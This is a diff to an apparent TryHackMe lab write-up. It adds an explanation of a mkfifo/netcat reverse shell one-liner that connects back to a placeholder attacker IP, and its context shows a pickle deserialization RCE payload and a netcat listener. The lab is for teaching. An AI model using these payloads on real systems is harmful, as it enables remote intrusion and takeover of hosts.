@@ -118,6 +118,14 @@
     print(base64.b64encode(pickle.dumps(rce())))
     ```
 
+    > Explanation of the code:
+    > - `rm /tmp/f` - removes the file if it exists.
+    > - `mkfifo /tmp/f` - creates a named IO pipe.
+    > - `cat /tmp/f | /bin/sh -i 2>&1` - contents of the named pipe is printed and piped into `/bin/sh`.
+    > - `netcat YOUR_TRYHACKME_VPN_IP 1234 > /tmp/f` 
+    >    - The output of the commands executed by `/bin/sh` is directed into stdin of nc.
+    >    - The output of nc (commands coming over the network) is redirected to the FIFO.
+
     - Listen using netcat: `nc -lvnp 1234`
     - Reload the page.
     - You will get a reverse shell:
